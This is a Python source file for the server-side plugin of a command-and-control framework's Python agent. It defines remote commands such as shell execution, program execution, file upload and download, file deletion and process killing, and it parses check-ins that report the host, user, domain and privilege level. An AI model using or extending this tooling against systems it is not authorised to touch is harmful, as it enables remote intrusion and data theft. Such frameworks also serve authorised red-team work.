"""Server-side plugin for the Python agent type."""

from executec2.agents.base import AgentPlugin
from executec2.server.models import MessageType, OSType, TaskType

# Command ID table (from 05_AGENT_SPEC.md)
_COMMANDS = [
    {"id": 4,  "name": "pwd",     "description": "Print working directory",      "args": []},
    {"id": 8,  "name": "cd",      "description": "Change directory",              "args": [{"name": "path", "type": "string", "required": True}]},
    {"id": 12, "name": "cp",      "description": "Copy file",                    "args": [{"name": "src", "type": "string", "required": True}, {"name": "dst", "type": "string", "required": True}]},
    {"id": 14, "name": "ls",      "description": "List directory",               "args": [{"name": "path", "type": "string", "required": False, "default": "."}]},
    {"id": 17, "name": "rm",      "description": "Remove file/directory",        "args": [{"name": "path", "type": "string", "required": True}]},
    {"id": 18, "name": "mv",      "description": "Move/rename file",             "args": [{"name": "src", "type": "string", "required": True}, {"name": "dst", "type": "string", "required": True}]},
    {"id": 21, "name": "config",  "description": "Update agent runtime config",  "args": [{"name": "sleep", "type": "int", "required": False}, {"name": "jitter", "type": "int", "required": False}]},
    {"id": 22, "name": "whoami",  "description": "Get current user identity",    "args": []},
    {"id": 24, "name": "cat",     "description": "Read file contents",           "args": [{"name": "path", "type": "string", "required": True}]},
    {"id": 27, "name": "mkdir",   "description": "Create directory",             "args": [{"name": "path", "type": "string", "required": True}]},
    {"id": 33, "name": "upload",  "description": "Upload file to target",        "args": [{"name": "path", "type": "string", "required": True}, {"name": "data", "type": "file", "required": True}]},
    {"id": 34, "name": "download","description": "Download file from target",    "args": [{"name": "path", "type": "string", "required": True}]},
    {"id": 41, "name": "ps",      "description": "List running processes",       "args": []},
    {"id": 42, "name": "kill",    "description": "Kill process by PID",          "args": [{"name": "pid", "type": "int", "required": True}]},
    {"id": 43, "name": "exec",    "description": "Execute program",              "args": [{"name": "program", "type": "string", "required": True}, {"name": "args", "type": "string", "required": False}]},
    {"id": 46, "name": "jobs",    "description": "List background jobs",         "args": []},
    {"id": 47, "name": "jobkill", "description": "Kill background job",          "args": [{"name": "job_id", "type": "string", "required": True}]},
    {"id": 50, "name": "shell",   "description": "Execute shell command",        "args": [{"name": "command", "type": "string", "required": True}]},
    {"id": 99, "name": "exit",    "description": "Terminate agent",              "args": []},
]

_CMD_BY_NAME = {c["name"]: c for c in _COMMANDS}


class PythonAgentPlugin(AgentPlugin):
    """Server-side plugin for the Python agent."""

    WATERMARK = "py01c2e0"
    NAME = "python"
    COMPATIBLE_LISTENERS = ["http"]

    def get_info(self) -> dict:
        return {
            "name": self.NAME,
            "watermark": self.WATERMARK,
            "compatible_listeners": self.COMPATIBLE_LISTENERS,
        }

    def parse_beat(self, beat_data: dict) -> dict:
        """Extract agent registration fields from beat dict."""
        return {
            "name": self.NAME,
            "computer": beat_data.get("hostname", ""),
            "username": beat_data.get("username", ""),
            "domain": beat_data.get("domain", ""),
            "internal_ip": beat_data.get("internal_ip", ""),
            "os": OSType(beat_data.get("os", 2)),
            "os_desc": beat_data.get("os_desc", ""),
            "arch": beat_data.get("arch", ""),
            "pid": beat_data.get("pid", 0),
            "process": beat_data.get("process", ""),
            "elevated": beat_data.get("elevated", False),
            "sleep": beat_data.get("sleep", 60),
            "jitter": beat_data.get("jitter", 0),
        }

    def build_task(self, command_name: str, args: dict) -> dict:
        cmd_def = _CMD_BY_NAME.get(command_name)
        if cmd_def is None:
            raise ValueError(f"Unknown command: {command_name}")
        return {
            "type": int(TaskType.TASK),
            "cmd": cmd_def["id"],
            "args": args,
        }

    def process_response(self, task_id: str, response: dict) -> dict:
        status = response.get("status", 2)
        output = response.get("output", b"")
        error = response.get("error", "")

        if isinstance(output, (bytes, bytearray)):
            output_str = output.decode("utf-8", errors="replace")
        else:
            output_str = str(output)

        if status == 1:
            msg_type = MessageType.SUCCESS
            message = output_str
            completed = True
        elif status == 2:
            msg_type = MessageType.ERROR
            message = error or output_str
            completed = True
        else:  # in_progress
            msg_type = MessageType.INFO
            message = output_str
            completed = False

        return {
            "message_type": int(msg_type),
            "message": message,
            "clear_text": output_str,
            "completed": completed,
        }

    def get_commands(self) -> list[dict]:
        return list(_COMMANDS)
